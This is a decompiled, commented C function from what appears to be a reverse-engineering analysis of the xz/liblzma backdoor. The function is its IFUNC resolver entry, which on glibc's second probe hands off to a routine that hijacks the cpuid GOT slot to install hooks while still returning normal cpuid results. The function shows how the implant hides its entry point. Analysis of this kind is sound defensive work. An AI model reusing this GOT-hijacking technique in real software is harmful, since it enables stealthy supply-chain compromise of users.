// /home/kali/xzre-ghidra/xzregh/10A720_cpuid_ifunc_resolver_entry.c
// Function: cpuid_ifunc_resolver_entry @ 0x10A720
// Calling convention: __stdcall
// Prototype: uint __stdcall cpuid_ifunc_resolver_entry(uint cpuid_request, u64 * caller_frame)


/*
 * AutoDoc: IFUNC resolver entry. Glibc probes it twice; the first call merely bumps `resolver_call_count`, while the second call
 * builds a scratch `elf_entry_ctx_t`, records the resolver frame, and hands the bundle to `cpuid_ifunc_patch_got_for_stage2()` so the loader can hijack
 * the cpuid GOT slot while glibc still thinks it is selecting an implementation. Every invocation ultimately calls `cpuid_query_and_unpack()` and
 * returns EAX so liblzma’s resolver contract stays intact.
 */

#include "xzre_types.h"

uint cpuid_ifunc_resolver_entry(uint cpuid_request,u64 *caller_frame)

{
  u32 cpuid_edx;
  u32 cpuid_eax;
  u32 cpuid_ebx;
  u32 cpuid_ecx;
  elf_entry_ctx_t state;
  
  // AutoDoc: Only the second resolver invocation runs the heavyweight loader work; the first probe just increments the counter.
  if (resolver_call_count == 1) {
    // AutoDoc: Clear the stack `elf_entry_ctx_t` and stash the resolver frame so `cpuid_ifunc_patch_got_for_stage2()` can rebuild the GOT math deterministically.
    state.cpuid_random_symbol_addr = (void *)0x1;
    state.got_ctx.tls_got_entry = (void *)0x0;
    state.got_ctx.cpuid_got_slot = (void *)0x0;
    state.got_ctx.cpuid_slot_index = 0;
    state.got_ctx.got_base_offset = 0;
    state.resolver_frame = caller_frame;
    // AutoDoc: Let the loader patch the cpuid GOT entry, install the hooks, and then restore the original target before glibc resumes.
    cpuid_ifunc_patch_got_for_stage2(&state,caller_frame);
  }
  resolver_call_count = resolver_call_count + 1;
  // AutoDoc: Regardless of loader state we still execute the canonical cpuid dispatcher and return its EAX result to satisfy IFUNC callers.
  cpuid_query_and_unpack(cpuid_request,&cpuid_eax,&cpuid_ebx,&cpuid_ecx,&cpuid_edx);
  return cpuid_eax;
}

